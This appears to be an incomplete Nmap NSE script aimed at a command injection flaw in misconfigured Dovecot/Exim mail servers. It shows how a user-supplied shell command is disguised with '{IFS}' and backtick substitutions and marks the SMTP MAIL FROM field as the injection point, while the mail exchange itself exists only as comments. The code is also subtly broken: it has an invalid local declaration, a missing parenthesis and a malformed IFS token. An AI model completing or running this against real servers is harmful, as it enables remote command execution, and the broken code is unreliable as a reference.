description = [[
Attempts to exploit a remote command execution vulnerability in misconfigured Dovecot/Exim mail servers.
]]

---
-- @usage
-- 
-- @output
--
-- @args 
--
---

author = "Paulino Calderon <calderon@websec.mx>"
license = "Same as Nmap--See http://nmap.org/book/man-legal.html"
categories = {"exploit"}

portrule = shortport.port_or_service({25, 465, 587},
                {"smtp", "smtps", "submission"})

local "smtp" = require "smtp"

action = function(host, port)
  local cmd = stdnse.get_script_args(SCRIPT_NAME..".cmd") or "uname"
  --Prepare payload
  cmd = string.gsub(cmd, " ", "{IFS}")
  cmd = string.gsub(cmd, ";", "``")
  
  local user = stdnse.get_script_args(SCRIPT_NAME..".user") or nil
  local pwd = stdnse.get_script_args(SCRIPT_NAME..".pwd") or nil
  local from = stdnse.get_script_args(SCRIPT_NAME..".from") or "nmap@nmap.org"
  local to = stdnse.get_script_args(SCRIPT_NAME..".to" or "nmap@mailinator.com"

  --ehlo
  --login if needed
  --mail from <- injection point
  --mail to
  --send mail
end
